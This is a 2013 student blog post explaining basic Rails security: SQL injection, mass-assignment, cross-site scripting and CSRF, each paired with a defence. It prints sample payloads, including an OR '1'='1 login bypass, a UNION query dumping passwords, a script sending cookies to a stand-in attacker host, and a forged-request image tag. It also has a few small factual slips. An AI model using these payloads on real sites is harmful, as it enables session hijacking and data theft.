---
layout: post
title: "Basic Rails Security"
date: 2013-09-12 02:20
comments: true
categories: 
---

Recording on version control from the octocat animal shelter aka the hackathon of life aka the conference room that looks a lot like a bar aka the xss justice league aka the no-sql-no-cry school aka the pull-request-of-destiny school aka the ask-me-about-blocks-procs-and-lambdas school aka the Flatiron School in purgatory

Now that I have some idea how to control my tables and views my next big task is to make sure no one else gets any ideas about how to control my tables and views. Security is for lovers. I love my databases and I love my users and I don't want any sql injection or cross-site scripting getting between us.

###The SQL Hamburgler  
Sql injection is the hostile practice of using sql fragments in form inputs to manipulate the database queries that will happen when processing that form. In Pleasantville form inputs supply only values to sql statements. In Crooklyn inputs are fragments of sql statements that will be processed as part of the database query. The corrupt database queries will perform actions that suit your attacker's interests more than yours. Sql injection attacks usually have one of two objectives:

1. Bypassing Authorization  
      {% codeblock %}
      Example:   
    
      An attacker entering   ' OR '1'='1   in the name field and   ' OR '1'='1  
      in the password field results in the sql statement:
    
      SELECT * FROM users WHERE login = ''  
      OR '1'='1'  
      AND password = ''  
      OR '2'>'1' LIMIT 1

      This statement will always set the session's current_user to the first user  
      in the table. The attacker is now logged in as that user whether or not the  
      attacker is even a casual acquaintance of theirs.
      {% endcodeblock %}
  
2. Unauthorized Reading
      {% codeblock %}
      Example:
    
      Given the query  
      Project.where("name = '#{params[:name]}'")  
      an attacker entering  
      ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --  
      in the name field results in the sql statement:
    
      SELECT * FROM projects WHERE (name = '') UNION
      SELECT id,login AS name,password AS description,1,1,1 FROM users --' 
    
      If the number of columns in both queries matches then then this statement  
      will return a list of all user names and passwords.
      {% endcodeblock %}

Defense Against the Dark Arts  

The counter-spell to SQL injection is to handle the database query plan and the values separately. As of Rails 3.1 ActiveRecord enables prepared statements in database queries. A prepared statement looks like:

    SELECT "people".* FROM "people" WHERE "people"."id" = ? LIMIT 1  [["id", 1]]
    
For higher-level commands like :new and :find ActiveRecord takes care of the formatting. For lower-level commands like :where and :select you have to do it yourself. Both of these result in prepared statements:
    
    Person.where("user_name = ? AND password = ?", user_name, password).first
    
    Person.new(name: "Spider Jerusalem")



Before prepared statements ActiveRecord took four steps to execute a database query:  

1. Parse SQL statement  
2. Come up with query plan  
3. Execute query plan  
4. Return results

Without prepared statements the query plan depends on parsing the SQL statement, user input and all. This way SQL fragments in values can affect the query plan.

With prepared statements the database comes up with a query plan and caches it before we send any values. We then send the values along with a token for the cached sequel statement. With the statement already cached(meaning after the first query) the database only needs to perform 2 steps:

1. Execute the query plan
2. Return results

This way the values have no affect on the query plan. If an attacker inputs some SQL craziness ActiveRecord will only wind up searching the corresponding column for a row containing that SQL craziness. No harm done.

Efficiency side-note: on SQlite3 and Postgres caching prepared statements means dramatically more efficient database queries. The effect is greater with more complex queries because the query planning step takes longer. On mySQL, however, prepared statements are actually less efficient for simple queries because there is no separate step for query planning in these simple cases. mySQL does still follow the general trend for more complex queries.

###Mass-assignment

Mass-assignment is a convenient way of processing all the params of a form at once. The vulnerability is that params you don't want to assign can be sent to your controller. For example, with the http request:

    PUT http://massassignment.com/users/1?user[can_edit_anything]=true

We don't want to assign can_edit_anything without deliberation. By listing attributes under attr-accessible in the model we tell ActiveRecord which attributes it can mass-assign. These should be the benign attributes. Attributes like can_edit_anything have no place on that list.

    class User < ActiveRecord::Base
      attr_accessible :firstname, :lastname
    end
    
We can also customize the list for different roles:

    class User < ActiveRecord::Base
      attr_accessible :firstname, :lastname
      attr_accessible :can_edit_anything, :as => :admin
    end
    
The attributes that are listed as accessible will still be protected from meddling as long as your controller is doing it's job. The controller should be checking that you are logged in as the current user before changing the current user's attributes. So you can change your name as many times as you want but no one else can.


###Cross-Site Scripting Attacks

Cross-site Scripting While SQL injection is a server-side attack, Cross-site Scripting is a client-side attack. In this case, attackers are taking advantage of their input being rendered with the DOM to change the functionality of the page. Cross-site Scripting attacks usually have one of these objectives:

1. Stealing the cookie to hijack the session

    {% codeblock %}
    Example:
    
    An attacker enters 
    
      <script>document.write('<img src="http://www.cookiemonster.com/' + document.cookie + '">');</script> 
    
    in a field that is unceremoniously dumped into the DOM. The  
    resulting http request to attacker.com will the cookie information  
    included in the request.
    
    The attacker can then check the logs for www.cookiemonster.com and see
    
      GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
    {% endcodeblock %}

2. Redirecting to a fake website 

    {% codeblock %}
    Example:
    
    An attacker enters
    
      "><script>document.location='http://yoursoulismine.com';</script>
    
    in a field that is unceremoniously dumped into the DOM. 
    
    The page will then redirect to the attacker's url. An attacker might use this  
     traffic to get more twitter followers, or they might use a phishing site  
     that imitates the previous page to coax the user into giving  
     them sensitive information. 
    
    Historical side-note: The term "phishing" comes from <><,  
    a common html tag in chat transcripts that attackers exploited  
    in the earliest of such scams. 
    {% endcodeblock %}

3. Defacement
    
    {% codeblock %}
    Example:
    
    An attacker enters
    
      <iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
    
    in a field that is unceremoniously dumped into the DOM.
    
    Similar to the redirect example, an attacker could open an  
    iframe that impersonates a part of the original site.  
    Here the goal might be to display advertisements or, as before,  
    to coax the user into supplying sensitive information.
    {% endcodeblock %}

4. Installing malicious software through security holes in the web browser.

    See "Samy": http://en.wikipedia.org/wiki/Samy_(computer_worm)

 
Defense against the dark arts:

To defend against cookie-stealers we can include httpOnly in the HTTP response header. httpOnly is a flag that can be set on a cookie. This flag makes it so the cookie can only be sent in http requests and it cannot be accessed by client-side script. This defense is effective against ordinary javascript injection but is still vunerable to asynchronous scripts.

Popularity side-note: In 2011 this [Report](http://w2spconf.com/2010/papers/p25.pdf) found that just over half the top 50 sites do not use httpOnly and as a result are vulnerable to cookie-stealing xss attacks. As of version 2.3.2 Rails was the only open source framework to set the HTTP-only flag by default. Minswan.

The best defense against xss is old-fashioned santizing of user input. Whitelisting is better than blacklisting. With a blacklist, if you are only filtering the input once then an attacker might anticipate your filter by burying their malicious code in the second layer of their input. For example, <scrscriptipt>, after filtering out 'script', will still read 'script'. So only accept the good input don't try to filter the bad.


###Cross-Site Request Forgeries

Cross-site Request Forgeries are like Cross-site Scripting attacks in that they are client-side attacks. In this case, however, the attacker exploits the possibility of the user being logged in on another site. If they are logged in the attack sends a malicious http request to that site.

    {% codeblock %}
    Example:
    
    An attacker posts
    
      <img src="http://bank.com/account/1/destroy" />

so that when a user loads the page with that img tag the  
http request is sent to look for an img. If the user is still  
logged in to bank.com then the  request will go through and quietly  
do the attacker's bidding. 
    {% endcodeblock %}

Defense against the dark arts:

Being careful about seperating GET and POST helps with the most basic attacks. Rails just about forces good behavior on this front so no GET request should be executing business logic. There is, however, still the case of when an attacker tricks a user into submitting a form with dangerous hidden values.

The [Synchronizer Token Pattern](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet) calls for embedding a random, unique token in all forms for a given session. The controller action can then check the token to verify that the HTTP request came from an authorized form.
 

###Conclusion

Prepared statements, attr-accessible, httpOnly, and restful controller actions are very simple ways of protecting yourself. The Synchronizer Token Pattern takes a little more work but sounds straight-forward. Not having experience with security, I imagine most of the time spent locking down a site goes into sanitizing user input with whitelists and regExp. If you want to survive you can't trust anyone with a keyboard or a touch-screen or a magic mouse or a wiimote.

